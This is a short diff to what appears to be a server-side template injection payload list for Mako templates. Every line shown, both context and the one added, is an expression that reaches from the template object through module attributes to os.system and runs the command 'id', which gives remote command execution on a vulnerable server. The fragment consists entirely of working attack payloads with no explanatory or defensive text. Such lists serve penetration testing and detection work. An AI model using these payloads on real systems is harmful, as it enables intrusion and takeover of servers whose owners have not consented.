@@ -56,3 +56,4 @@ ${self.module.filters.compat.inspect.os.system("id")}
 ${self.module.runtime.compat.inspect.os.system("id")}
 ${self.module.runtime.exceptions.util.os.system("id")}
 ${self.template.__init__.__globals__['os'].system('id')}
+${self.module.cache.util.compat.inspect.os.system("id")}
